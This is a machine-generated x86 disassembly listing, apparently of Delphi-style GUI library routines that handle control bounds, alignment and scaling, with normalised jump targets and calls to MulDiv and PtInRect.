mov edx 0x2
call sub_40402c
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_442be8
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_442bb8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_442bb8
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404414
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_40405c
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_442ad8
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_444b88
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403430
sub_444bb4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_444bd4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_444bf4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_444c14
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_444c34
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_444c54
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_444c74
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_420b64
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_44220c
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403430
sub_444cac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_444d48
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41ab48
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_44f53c
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44f674
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_442bb8
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44f3d4
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_44f794
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444d4f
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_444d58
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_444d94
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_444d58
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_444e44
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_4033c0
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_444e78
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_444e98
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403430
test al al
je r-xdata
mov eax edi
call sub_444ed8
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_444f04
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_444f30
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406dd8
mov eax esp
call sub_419084
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_4426fc
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403430
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403430
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_442728
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_419084
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_41900c
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_4426d0
sub_445058
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_445098
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4418fc
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_4450cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_4451c4
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_441cb8
push ebx
push sub_446b5c
call sub_4217b8
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4240c8
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_424270
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_403558
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460670
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_40405c
lea eax [ ebx + 0x188 ]
call sub_404008
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4451cb
lea eax [ ebp - 0x8 ]
call sub_404008
retn
sub_4451cb
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_4451f0
push ebx
push esi
push edi
call sub_4035c0
mov ebx edx
mov edi eax
mov eax edi
call sub_4209b4
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_405a38
mov eax [ edi + 0x178 ]
call sub_403234
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_440864
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_445e90
mov eax edi
call sub_4460d0
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403234
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_446094
mov esi eax
mov edx esi
mov eax edi
call sub_445efc
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_4460d0
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_441d90
test bl bl
jle r-xdata
call sub_421850
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035a8
sub_4452c0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_445384
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41a660
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403234
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_449598
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_41a468
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_41a5b4
mov edx esi
mov eax [ ebp - 0xc ]
call sub_41a468
test eax eax
je r-xdata
sub_445394
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_445c38
xor eax eax
push ebp
push sub_4453d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_441ff4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4453db
mov eax [ ebp - 0x4 ]
call sub_445c40
retn
sub_4453db
mov eax [ ebp - 0x4 ]
call sub_4452c0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_446a94
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_443d6c
sub_445410
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_44542b ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_44549c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4496dc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_41900c
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_44581d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445824
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_445732 ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_445695
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_445824
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_445853 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_4458dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4460d0
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41a30c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_41a468
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_44549c
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_446094
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_41a4e4
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_41a468
mov edx eax
mov ecx ebx
mov eax edi
call sub_445410
pop ecx
test al al
je r-xdata
